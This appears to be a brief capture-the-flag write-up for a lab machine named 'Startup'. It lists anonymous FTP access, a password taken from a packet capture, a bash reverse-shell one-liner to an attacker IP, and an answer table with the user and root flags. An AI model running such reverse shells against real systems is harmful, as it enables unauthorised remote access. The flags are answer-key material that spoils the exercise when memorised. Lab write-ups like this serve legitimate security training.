# Startup

ip : `10.10.148.231`

loged in as anonymous over ftp and download `notice.txt` and `important.jpg`

got www-data password `c4ntg3t3n0ughsp1c3` from the suspicious.pcapng file

getting a netcat session 
```
bash -c 'exec bash -i &>/dev/tcp/10.17.48.110/1235 <&1'
```

| Questions | Answers |
|-----------|---------|
| What is the secret spicy soup recipe? | love |
| What are the contents of user.txt | THM{03ce3d619b80ccbfb3b7fc81e46c0e79} |
| What are the contents of root.txt | THM{f963aaa6a430f210222158ae15c3d76d} |
